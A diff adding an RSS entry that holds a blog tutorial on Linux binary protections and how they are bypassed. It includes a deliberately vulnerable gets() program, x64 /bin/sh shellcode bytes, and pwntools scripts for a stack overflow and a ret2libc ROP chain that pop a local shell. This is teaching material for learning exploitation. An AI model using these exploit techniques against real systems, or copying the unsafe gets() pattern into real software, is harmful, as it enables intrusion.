@@ -6,8 +6,525 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>en-us</language>
 		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-		<lastBuildDate>Thu, 24 Sep 2020 18:01:34 -0300</lastBuildDate>
+		<lastBuildDate>Mon, 01 Feb 2021 17:30:00 -0300</lastBuildDate>
 		<atom:link href="https://mdanilor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Understanding binary protections (and how to bypass) with a dumb example</title>
+			<link>https://mdanilor.github.io/posts/memory-protections/</link>
+			<pubDate>Mon, 01 Feb 2021 17:30:00 -0300</pubDate>
+			
+			<guid>https://mdanilor.github.io/posts/memory-protections/</guid>
+			<description>Hi! Long time no see, huh? I must apologize for my lousy post schedule. In spite of covid-19 outbreak forcing us to stay home, it appears that I&amp;rsquo;ve never had less time to spare in my life. Well, let&amp;rsquo;s get to it.
+Memory corruption issues often lead to pretty serious vulnerabilities. It is not uncommon for a stack or heap overflow, use-after-free, double free and others to lead to code execution.</description>
+			<content type="html"><![CDATA[<p>Hi! Long time no see, huh? I must apologize for my lousy post schedule. In spite of covid-19 outbreak forcing us to stay home, it appears that I&rsquo;ve never had less time to spare in my life. Well, let&rsquo;s get to it.</p>
+<p>Memory corruption issues often lead to pretty serious vulnerabilities. It is not uncommon for a stack or heap overflow, use-after-free, double free and others to lead to code execution. A few mitigations try to prevent this class of bugs from causing too much trouble, or at least to make the exploitation harder. Nevertheless, memory corruption is still a thing. Today we&rsquo;ll talk about these mitigations, how they work, how effective they are and how they are commonly bypassed.</p>
+<h2 id="in-the-beginning">In the beginning&hellip;</h2>
+<p>Back in the day memory corruption was a sure path towards code execution. There were no protections at all and a simple stack overflow was enough to make a flow hijack.</p>
+<p>Nowadays when you use GCC to compile a simple C program, the binary will be generated protected as hell. Let&rsquo;s check it out:</p>
+<p><strong>test.c</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#define SIZE 16
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">get_buffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">strout</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Please input a string (max length %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">strout</span><span class="p">);</span> <span class="c1">//oh, shush
+</span><span class="c1"></span><span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>
+    <span class="n">get_buffer</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;The buffer is:</span><span class="se">\n</span><span class="s">%s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">└────╼ gcc test.c -o <span class="nb">test</span>
+└────╼ checksec --file<span class="o">=</span><span class="nb">test</span>
+
+RELRO           STACK CANARY      NX            PIE            
+Full RELRO      Canary found      NX enabled    PIE enabled   
+</code></pre></div><p>It has full RELRO, stack canary, NX and PIE. Not to mention that Linux will, by default, provide ASLR in runtime. (A little lost in these terms? No worries, we&rsquo;ll get over them in no time)</p>
+<p>So let&rsquo;s rewind to the early days and deactivate all these memory protections. We&rsquo;ll enable them later and see how they affect exploitation.</p>
+<pre><code>└────╼ gcc test.c -o test -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
+└────╼ checksec --file=test
+RELRO           STACK CANARY      NX            PIE             
+No RELRO        No canary found   NX disabled   No PIE
+</code></pre><p>We compile our test file with no protections at all. I&rsquo;ll also deactivate ASLR protection on my box:</p>
+<pre><code>└────╼ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre><p>Now we clearly have a stack overflow (or a stack out-of-bounds memory write, if you prefer). This program can be easily transformed into a terminal for code execution. If you have no idea how you can do this, <a href="https://mdanilor.github.io/posts/oscp-bof/">this</a> is a good place start. In that blog post we cracked an OSCP-like stack overflow on Windows. Here we use Linux. The tools are different, but the principles are the same.</p>
+<p>Keep in mind that this is a mock test program, which will be used for our examples today. It runs locally, but you can (use your imagination and) picture it as if it was a server input, for example.</p>
+<p>We now need to craft a shellcode (a code which will give us shell!) to trigger code execution.</p>
+<h3 id="crafting-our-payload">Crafting our payload</h3>
+<p>First we need a shellcode. There&rsquo;s no need to reinvent the wheel. <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Here</a> we see a x64 shellcode we can use (thank you, shell-storm!).</p>
+<p>The code of the shellcode may be seen below. Although assembly can be tough to understand at some times, I have added a few comments which might make it easier to grasp:</p>
+<pre><code>    xor eax, eax ; Zeroes out eax
+    mov rbx, 0xFF978CD091969DD1 ; this puts &quot;/bin/sh&quot; with a zero by the end. But it is actually negated (so one may put '\0' and not cause the program to think it is the end of the string)
+    neg rbx ; Negates RBX
+    push rbx ; pushes RBX to stack
+    push rsp ; This instruction pushed RSP to the stack
+    pop rdi ; And this instruction pops it to RDI. The stack points to the string &quot;/bin/sh&quot;. Now RDI points to &quot;/bin/sh&quot;.
+    cdq ; Zeroes out RDX
+    push rdx ; Pushes zero to the stack.
+    push rdi ; Pushes RDI to stack, which is the pointer to the /bin/sh string.
+    push rsp ; Pushes RSP and
+    pop rsi ; pops into RSI. -&gt; rsi = rsp
+    mov al, 0x3b ; execve syscall number.
+    syscall ; SYSCALLS!
+</code></pre><p>Basically what it does is call the <code>execve</code> syscall providing &ldquo;/bin/sh&rdquo; as argument.</p>
+<p>And if we assemble this right (or just copy from shellstorm), we get the following bytes:</p>
+<pre><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+</code></pre><p>As this is not a stack overflow tutorial, I won&rsquo;t dive into too much details regarding the creation of our payload. Instead, I&rsquo;ll keep it breef. If you feel lost, I strongly recommend you look into the <a href="https://mdanilor.github.io/posts/oscp-bof/">OSCP-like stack overflow exploitation tutorial</a>.</p>
+<p>I&rsquo;ll run the program and attach GDB to it. I&rsquo;ll also put a breakpoint in the main <code>ret</code> (or, rather, <code>retq</code>) instruction.</p>
+<pre><code>(gdb) disass main
+Dump of assembler code for function main:
+   0x000000000040052d &lt;+0&gt;:	push   %rbp
+   0x000000000040052e &lt;+1&gt;:	mov    %rsp,%rbp
+   0x0000000000400531 &lt;+4&gt;:	sub    $0x20,%rsp
+   0x0000000000400535 &lt;+8&gt;:	mov    %edi,-0x14(%rbp)
+   0x0000000000400538 &lt;+11&gt;:	mov    %rsi,-0x20(%rbp)
+   0x000000000040053c &lt;+15&gt;:	lea    -0x10(%rbp),%rax
+   0x0000000000400540 &lt;+19&gt;:	mov    %rax,%rdi
+   0x0000000000400543 &lt;+22&gt;:	callq  0x4004f7 &lt;get_buffer&gt;
+   0x0000000000400548 &lt;+27&gt;:	lea    -0x10(%rbp),%rax
+   0x000000000040054c &lt;+31&gt;:	mov    %rax,%rsi
+   0x000000000040054f &lt;+34&gt;:	lea    0xc9(%rip),%rdi        # 0x40061f
+   0x0000000000400556 &lt;+41&gt;:	mov    $0x0,%eax
+   0x000000000040055b &lt;+46&gt;:	callq  0x4003f0 &lt;printf@plt&gt;
+   0x0000000000400560 &lt;+51&gt;:	mov    $0x0,%eax
+   0x0000000000400565 &lt;+56&gt;:	leaveq 
+   0x0000000000400566 &lt;+57&gt;:	retq   
+(gdb) b *0x0000000000400566
+Breakpoint 3 at 0x400566
+</code></pre><p>Now I&rsquo;ll send a bunch of &ldquo;A&quot;s to see if we can trigger anything.</p>
+<pre><code>Please input a string (max length 16)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+</code></pre><p>And our breakpoint hits. Let&rsquo;s see what&rsquo;s in the stack.</p>
+<pre><code>Thread 1 &quot;test&quot; hit Breakpoint 3, 0x0000000000400566 in main ()
+(gdb) x/10x $rsp
+0x7fffffffdda8:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffddb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffddc8:	0x41414141	0x41414141
+
+
+</code></pre><p>So our payload is in the stack right before <code>retq</code> is called. <code>retq</code> is just a nickname for <code>pop rip</code>, which pops the stack to the instruction pointer and redirect the flow to the program. Since we control part of the stack, we can put our shellcode somewhere in there. But how would we trigger it?</p>
+<p>Since the stack address will remain the same everytime we run the program, we can put the address for our payload right in <code>0x7fffffffdda8</code>. And our shellcode right after (<code>0x7fffffffddb0</code>). By doing some inspection (printing values in the stack), we find out that the region we control starts at <code>0x7fffffffdd90</code>.</p>
+<p>How do I know this? Well, I used <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern</a>. But another way is by mere inspection:</p>
+<pre><code>(gdb) x/10x $rsp-30
+0x7fffffffdd8a:	0x00010040	0x41410000	0x41414141	0x41414141
+0x7fffffffdd9a:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffddaa:	0x41414141	0x41414141
+(gdb) x/10x $rsp-24
+0x7fffffffdd90:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdda0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffddb0:	0x41414141	0x41414141
+(gdb) x/10x $rsp-25
+0x7fffffffdd8f:	0x41414100	0x41414141	0x41414141	0x41414141
+0x7fffffffdd9f:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffddaf:	0x41414141	0x41414141
+
+</code></pre><p>By inspection, we see that the stack pointer at the moment <code>retq</code> is called points to the position 24 of our buffer.</p>
+<p>So we need a 24 byte long padding. This is what our payload will look like:</p>
+<p><code>[24 bytes padding] + [address to our shellcode (0x7fffffffddb0)] + [shellcode]</code></p>
+<p>Using python to build our payload and print it, or send it to a file, or call the program directly, we&rsquo;d have this:</p>
+<pre><code>payload = &quot;A&quot;*24 + &quot;\xb0\xdd\xff\xff\xff\x7f\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+</code></pre><p>I&rsquo;ll write a python &ldquo;exploit&rdquo; for this using <a href="http://docs.pwntools.com/en/latest/">pwntools</a>:</p>
+<pre><code>from pwn import *
+context(arch='amd64', os='linux')
+payload = &quot;A&quot;*24 + &quot;\xb0\xdd\xff\xff\xff\x7f\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+
+io = process(&quot;/home/danilo/tmp/test&quot;)
+io.readline()
+io.sendline(payload)
+io.interactive()
+</code></pre><p>What this code does is open the target program, read the &ldquo;Please input a string (max length 16)&rdquo; line, send our payload and open an interactive channel with the program. The result is a shell:</p>
+<pre><code>└────╼ python3 exploit.py 
+[+] Starting local process '/home/danilo/tmp/test': pid 20836
+[*] Switching to interactive mode
+The buffer is:
+$ ls
+exploit.py  test  test.c
+$ pwd
+/home/danilo/tmp
+$ 
+
+</code></pre><p>Great! So upon finding a buffer overflow, it is relatively easy to exploit it into code execution. Or at least it was a couple of decades ago. Now let&rsquo;s enable the protections and see how it goes.</p>
+<p>In the next few sections I&rsquo;ll present each memory corruption mitigation. They are not in any specific order.</p>
+<h2 id="stack-canary">Stack Canary</h2>
+<p><img src="/posts/memory-mitigations-img/canary.jpeg" alt="Canary"></p>
+<p>How cute are canaries?</p>
+<p>Well, very cute. According to wikipedia, coal miners used canaries to detect if there was any toxic gases, such as carbon monoxide, in the workplace. Or a snitch: an informant who sings to the police. And they totally mitigate stack overflow vulnerabilities.</p>
+<p>The issue with the program we wrote on the previous section was a stack overflow. That means we had a buffer in our stack on which we could write an arbitrary amount of data, even if it surpasses the designated size of the buffer. An adversary may overwrite other data in the memory, such as the return address, and make a flow hijack, leading to arbitrary code execution.</p>
+<p>The stack canary is made to detect if the return address was overwritten and make it more difficult to make a flow hijack.</p>
+<p>It works very simply, but also very elegantly. An 8 byte long semi-random integer is put before the return address in the stack (see the representation below). Before the function returns, it checks if the canary has been altered. If it hasn&rsquo;t, the flow continues gracefully. If it has, the program will crash. I said semi-random because not all bytes are random. There are 7 random bytes and a null byte ('\0'). If an adversary has an out of bounds write, he or she will have to overwrite the canary to get to the return address. The null byte was chosen because it is the string terminator. An adversary should have trouble inputting a string with a null byte. In case of a memory leak, the null byte will act as the string terminator before the canary can be printed.</p>
+<pre><code>+-----------------------+
+|                       |
+|         ...           |
+|                       |
++-----------------------+
+|                       |
+|                       |
+|                       |
+|   Vulnerable buffer   |
+|                       |
+|                       |
+|                       |
++-----------------------+
+|                       |
+|      Stack canary     |
++-----------------------+
+|                       |
+|     Return address    |
++-----------------------+
+|                       |
+|          ...          |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
+|                       |
++-----------------------+
+
+</code></pre><p>Let&rsquo;s recompile our binary, now removing the <code>-fno-stack-protector</code> option:</p>
+<pre><code>gcc test.c -o test -z execstack -no-pie -Wl,-z,norelro
+</code></pre><p>Now disassemble with gdb:</p>
+<pre><code>└────╼ gdb ./test
+(gdb) disass main
+Dump of assembler code for function main:
+   0x000000000040059d &lt;+0&gt;:	push   %rbp
+   0x000000000040059e &lt;+1&gt;:	mov    %rsp,%rbp
+   0x00000000004005a1 &lt;+4&gt;:	sub    $0x30,%rsp
+   0x00000000004005a5 &lt;+8&gt;:	mov    %edi,-0x24(%rbp)
+   0x00000000004005a8 &lt;+11&gt;:	mov    %rsi,-0x30(%rbp)
+   0x00000000004005ac &lt;+15&gt;:	mov    %fs:0x28,%rax
+   0x00000000004005b5 &lt;+24&gt;:	mov    %rax,-0x8(%rbp)
+   0x00000000004005b9 &lt;+28&gt;:	xor    %eax,%eax
+   0x00000000004005bb &lt;+30&gt;:	lea    -0x20(%rbp),%rax
+   0x00000000004005bf &lt;+34&gt;:	mov    %rax,%rdi
+   0x00000000004005c2 &lt;+37&gt;:	callq  0x400567 &lt;get_buffer&gt;
+   0x00000000004005c7 &lt;+42&gt;:	lea    -0x20(%rbp),%rax
+   0x00000000004005cb &lt;+46&gt;:	mov    %rax,%rsi
+   0x00000000004005ce &lt;+49&gt;:	lea    0xda(%rip),%rdi        # 0x4006af
+   0x00000000004005d5 &lt;+56&gt;:	mov    $0x0,%eax
+   0x00000000004005da &lt;+61&gt;:	callq  0x400460 &lt;printf@plt&gt;
+   0x00000000004005df &lt;+66&gt;:	mov    $0x0,%eax
+   0x00000000004005e4 &lt;+71&gt;:	mov    -0x8(%rbp),%rdx
+   0x00000000004005e8 &lt;+75&gt;:	xor    %fs:0x28,%rdx
+   0x00000000004005f1 &lt;+84&gt;:	je     0x4005f8 &lt;main+91&gt;
+   0x00000000004005f3 &lt;+86&gt;:	callq  0x400450 &lt;__stack_chk_fail@plt&gt;
+   0x00000000004005f8 &lt;+91&gt;:	leaveq 
+   0x00000000004005f9 &lt;+92&gt;:	retq   
+End of assembler dump.
+</code></pre><p>Here we see the assembly code of the main function. Note these lines specifically:</p>
+<pre><code>...
+   0x00000000004005ac &lt;+15&gt;:	mov    %fs:0x28,%rax
+   0x00000000004005b5 &lt;+24&gt;:	mov    %rax,-0x8(%rbp)
+
+...
+
+   0x00000000004005e4 &lt;+71&gt;:	mov    -0x8(%rbp),%rdx
+   0x00000000004005e8 &lt;+75&gt;:	xor    %fs:0x28,%rdx
+   0x00000000004005f1 &lt;+84&gt;:	je     0x4005f8 &lt;main+91&gt;
+   0x00000000004005f3 &lt;+86&gt;:	callq  0x400450 &lt;__stack_chk_fail@plt&gt;
+   0x00000000004005f8 &lt;+91&gt;:	leaveq 
+   0x00000000004005f9 &lt;+92&gt;:	retq   
+
+</code></pre><p>In &lt;+15&gt; and &lt;+24&gt; it puts the canary in the position %rbp-0x8. Note that the canary will remain the same throughout all functions within the program.</p>
+<p>Later on, on lines &lt;+71&gt;, &lt;+75&gt;, it loads the stored canary to %rdx and compares with the original value. If it is equal, (&lt;+84&gt;) meaning the canary hasn&rsquo;t been altered, it will jump to &lt;+91&gt; leaving the function gracefully. If it is not equal, the <code>__stack_chk_fail</code> function will be called, causing the program to crash:</p>
+<pre><code>└────╼ ./test 
+Please input a string (max length 16)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+The buffer is:
+*** stack smashing detected ***: &lt;unknown&gt; terminated
+Aborted (core dumped)
+</code></pre><p>This mitigation kills the vulnerability here. However, note that canary is not a silver bullet (or a silver shield??). It only prevents adversaries from writing beyond the canary. Anything before the canary can be overwritten. It is also only effective on stack out of bounds write. There are many other memory corruption bug classes, such as use-after-free, arbitrary read, arbitrary write, double free, and others. Moreover, there is the possibility of a canary leak, but that would depend on a second vulnerability.</p>
+<p>Summarizing, canaries offer a good protection against stack overflow vulnerabilities. A canary leak is a way to bypass this mitigation, but would depend on another vulnerability. The null-byte also mitigates for most part. However, it does not protect from other memory corruption vulnerabilities.</p>
+<h2 id="nx">NX</h2>
+<p>The NX (no-execute) bit is used to mark regions of memory as unexecutable. There&rsquo;s no reason for the stack or heap to be executed, for instance, since all the code is in the <code>.TEXT</code> region. With this protection enabled, adversaries need to get more creative to try and bypass the mitigation.</p>
+<p>This mitigation also makes our payload useless, since it gets executed in the stack. If we put our payload, we get exit code -11 (SIGSEGV). But is there any bypass?</p>
+<h3 id="ret2libc">Ret2libc</h3>
+<p>Well, yes. It means we can&rsquo;t add new code to the program, but we can conveniently reuse code that is already in the program.</p>
+<p>The return-to-libc technique is based on overwriting return addresses to point to gadgets in libc. Libc is enormous. There are gadgets to do pretty much anything there. For instance, there is the function <code>execve</code> previously used, which will set stuff up for calling the execve syscall.</p>
+<p>But exploiting gets a bit trickier.</p>
+<p>First, we deactivate the canary again and activate the NX protection:</p>
+<pre><code>gcc test.c -o test -fno-stack-protector -no-pie -Wl,-z,norelro
+</code></pre><p>To craft our new payload, we&rsquo;ll be using GDB with <a href="https://github.com/longld/peda">peda</a> plugin and <a href="https://github.com/Gallopsled/pwntools">pwntools</a> with python3.</p>
+<p>The goal here is to reuse existing code to get where we want. We need to call the execve syscall. I have started the program and attached gdb to it. I&rsquo;ll use <code>disass execve</code> to get the address of the execve libc wrapper:</p>
+<pre><code>gdb-peda$ disass execve
+Dump of assembler code for function execve:
+   0x00007ffff7ac6c00 &lt;+0&gt;:	mov    eax,0x3b
+   0x00007ffff7ac6c05 &lt;+5&gt;:	syscall 
+   0x00007ffff7ac6c07 &lt;+7&gt;:	cmp    rax,0xfffffffffffff001
+   0x00007ffff7ac6c0d &lt;+13&gt;:	jae    0x7ffff7ac6c10 &lt;execve+16&gt;
+   0x00007ffff7ac6c0f &lt;+15&gt;:	ret    
+   0x00007ffff7ac6c10 &lt;+16&gt;:	mov    rcx,QWORD PTR [rip+0x306251]        # 0x7ffff7dcce68
+   0x00007ffff7ac6c17 &lt;+23&gt;:	neg    eax
+   0x00007ffff7ac6c19 &lt;+25&gt;:	mov    DWORD PTR fs:[rcx],eax
+   0x00007ffff7ac6c1c &lt;+28&gt;:	or     rax,0xffffffffffffffff
+   0x00007ffff7ac6c20 &lt;+32&gt;:	ret    
+End of assembler dump.
+</code></pre><p>Here we see that the address of <code>execve</code> function is <code>0x00007ffff7ac6c00</code>. We need to pass &ldquo;/bin/bash&rdquo; as argument to that syscall, so it opens the terminal (which is our goal here). To do that, we need to set the <code>rdi</code> register to point to &ldquo;/bin/bash&rdquo; string. In addition, <code>rsi</code> register should be zero. You may be wondering how do I know that. Well, I have checked <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call table</a>.</p>
+<p>To correctly set the values for these two registers we need gadgets. Gadgets are parts of existing binary code which we can use to get the desired effect.</p>
+<p>We need to set <code>rdi</code> register to &ldquo;/bin/bash&rdquo;. We can put the string in the stack and use a <code>pop rdi;ret</code> gadget to load the address to <code>rdi</code>.</p>
+<p>Fortunately, libc is gigantic and have enough gadgets so we can do anything we want. And peda will make it very easy to find these gadgets. First let&rsquo;s see how our payload will be:</p>
+<p><code>padding + pop rdi; ret; + rdi value (pointer to &quot;/bin/bash&quot; string) + pop rsi; ret + rsi value (zero!) + execve addr + &quot;/bin/sh&quot;</code></p>
+<p>It starts with the 24 byte long padding. Then, we&rsquo;ll set the value of <code>rdi</code> to point to &ldquo;/bin/sh&rdquo; string. Then we&rsquo;ll zero <code>rsi</code> out. After that, <code>execve</code> addr will be put and, finally, the &ldquo;/bin/sh&rdquo; string.</p>
+<p>To find our gadgets, we&rsquo;ll use peda:</p>
+<pre><code>gdb-peda$ ropsearch &quot;pop rdi; ret&quot; libc
+Searching for ROP gadget: 'pop rdi; ret' in: libc ranges
+0x00007ffff7a035bf : (b'5fc3')	pop rdi; ret
+0x00007ffff7a044ae : (b'5fc3')	pop rdi; ret
+0x00007ffff7a04c37 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a04cbe : (b'5fc3')	pop rdi; ret
+0x00007ffff7a05bd2 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a05f4b : (b'5fc3')	pop rdi; ret
+0x00007ffff7a072e7 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a077ce : (b'5fc3')	pop rdi; ret
+0x00007ffff7a07ce6 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a08260 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a088b9 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a08b81 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a09647 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0a677 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0b79c : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0be84 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0ca1f : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0d0cc : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0dbcc : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0e198 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0e261 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0ef59 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a0f204 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a102d3 : (b'5fc3')	pop rdi; ret
+0x00007ffff7a10307 : (b'5fc3')	pop rdi; ret
+--More--(25/489)
+</code></pre><p>It has found 489 occurrences of &ldquo;pop rdi; ret&rdquo; in libc which we can use. Any one will do. I&rsquo;ll use <code>0x00007ffff7a035bf</code> to craft my payload.</p>
+<p>Now the other gadget:</p>
+<pre><code>gdb-peda$ ropsearch &quot;pop rsi; ret&quot; libc
+Searching for ROP gadget: 'pop rsi; ret' in: libc ranges
+0x00007ffff7a05eea : (b'5ec3')	pop rsi; ret
+0x00007ffff7a12097 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a229da : (b'5ec3')	pop rsi; ret
+0x00007ffff7a40854 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a461b3 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a4d1c5 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a5e8a4 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a60e93 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a60ecb : (b'5ec3')	pop rsi; ret
+0x00007ffff7a62ede : (b'5ec3')	pop rsi; ret
+0x00007ffff7a640d4 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a641b8 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a64fc9 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a66fa6 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a66ff1 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a69c62 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6a6e0 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6aa17 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6aac0 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6aaf6 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6b32f : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6bd09 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6c138 : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6e5ee : (b'5ec3')	pop rsi; ret
+0x00007ffff7a6f246 : (b'5ec3')	pop rsi; ret
+--More--(25/149)
+</code></pre><p>149 occurrences. Again, any one will do. I&rsquo;ll use <code>0x00007ffff7a05eea</code>.</p>
+<p>Ok, so we refine our stack payload:</p>
+<p><code>24 byte long padding + 0x00007ffff7a035bf + STACK ADDRESS FOR &quot;/bin/sh&quot; STRING + 0x00007ffff7a05eea + 0 + 0x00007ffff7ac6c00 + &quot;/bin/sh&quot;</code></p>
+<p>All that&rsquo;s left to do is find out the stack addr for &ldquo;/bin/sh&rdquo;. Gdb can do that for us. I&rsquo;ll prepare the payload without the stack address (will put some garbage instead), send the payload, and see where the string hits. Check the &ldquo;<em>exploit</em>&rdquo; out:</p>
+<pre><code>from pwn import *
+context(arch='amd64', os='linux')
+addr_execve = 0x00007ffff7ac6c00 # execve
+addr_poprdi_ret = 0x00007ffff7a035bf # pop rdi; ret
+addr_poprsi_ret = 0x00007ffff7a05eea # pop rsi; ret
+addr_binsh_str = 0xdeadbeefdeadbeef
+
+payload = b&quot;A&quot;*24 + pack(addr_poprdi_ret) + pack(addr_binsh_str) + pack(addr_poprsi_ret) + pack(0) +  pack(addr_execve) + b&quot;/bin/bash&quot; 
+
+io = process(&quot;/home/danilo/tmp/test&quot;)
+
+raw_input() # This will stop the program in time so we can attach gdb. 
+
+io.readline()
+io.sendline(payload)
+io.interactive()
+</code></pre><p>We can run it and attach gdb. A breakpoint will be put in the main return instruction.</p>
+<pre><code>gdb-peda$ disass main
+Dump of assembler code for function main:
+   0x000000000040052d &lt;+0&gt;:	push   rbp
+   0x000000000040052e &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000400531 &lt;+4&gt;:	sub    rsp,0x20
+   0x0000000000400535 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x14],edi
+   0x0000000000400538 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x20],rsi
+   0x000000000040053c &lt;+15&gt;:	lea    rax,[rbp-0x10]
+   0x0000000000400540 &lt;+19&gt;:	mov    rdi,rax
+   0x0000000000400543 &lt;+22&gt;:	call   0x4004f7 &lt;get_buffer&gt;
+   0x0000000000400548 &lt;+27&gt;:	lea    rax,[rbp-0x10]
+   0x000000000040054c &lt;+31&gt;:	mov    rsi,rax
+   0x000000000040054f &lt;+34&gt;:	lea    rdi,[rip+0xc9]        # 0x40061f
+   0x0000000000400556 &lt;+41&gt;:	mov    eax,0x0
+   0x000000000040055b &lt;+46&gt;:	call   0x4003f0 &lt;printf@plt&gt;
+   0x0000000000400560 &lt;+51&gt;:	mov    eax,0x0
+   0x0000000000400565 &lt;+56&gt;:	leave  
+   0x0000000000400566 &lt;+57&gt;:	ret    
+End of assembler dump.
+gdb-peda$ br *0x0000000000400566
+Breakpoint 1 at 0x400566
+gdb-peda$ c
+</code></pre><pre><code>Thread 1 &quot;test&quot; hit Breakpoint 1, 0x0000000000400566 in main ()
+gdb-peda$ x/10x $rsp
+0x7fffffffdda8:	0x00007ffff7a035bf	0xdeadbeefdeadbeef
+0x7fffffffddb8:	0x00007ffff7a05eea	0x0000000000000000
+0x7fffffffddc8:	0x00007ffff7ac6c00	0x7361622f6e69622f
+0x7fffffffddd8:	0xd1b02fd71f9c0068	0x0000000000400410
+0x7fffffffdde8:	0x00007fffffffde80	0x0000000000000000
+</code></pre><p>Looks like we found our target. And it is in address  <code>0x7fffffffddd0</code>:</p>
+<pre><code>gdb-peda$ x/s 0x7fffffffddd0
+0x7fffffffddd0:	&quot;/bin/bash&quot;
+</code></pre><p>So our final exploit is:</p>
+<pre><code>from pwn import *
+context(arch='amd64', os='linux')
+addr_execve = 0x00007ffff7ac6c00 # execve
+addr_poprdi_ret = 0x00007ffff7a035bf # pop rdi; ret
+addr_poprsi_ret = 0x00007ffff7a05eea # pop rsi; ret
+addr_binsh_str = 0x7fffffffddd0
+
+payload = b&quot;A&quot;*24 + pack(addr_poprdi_ret) + pack(addr_binsh_str) + pack(addr_poprsi_ret) + pack(0) +  pack(addr_execve) + b&quot;/bin/bash&quot; 
+
+io = process(&quot;/home/danilo/tmp/test&quot;)
+raw_input()
+io.readline()
+io.sendline(payload)
+io.interactive()
+
+</code></pre><p>And the result:</p>
+<pre><code>└────╼ python3 exploit.py 
+[+] Starting local process '/home/danilo/tmp/test': pid 15432
+
+[*] Switching to interactive mode
+The buffer is:
+$ whoami
+danilo
+$ 
+</code></pre><p>Very nice! We managed to make a flow hijack to get a terminal using libc gadgets.</p>
+<h2 id="aslr">ASLR</h2>
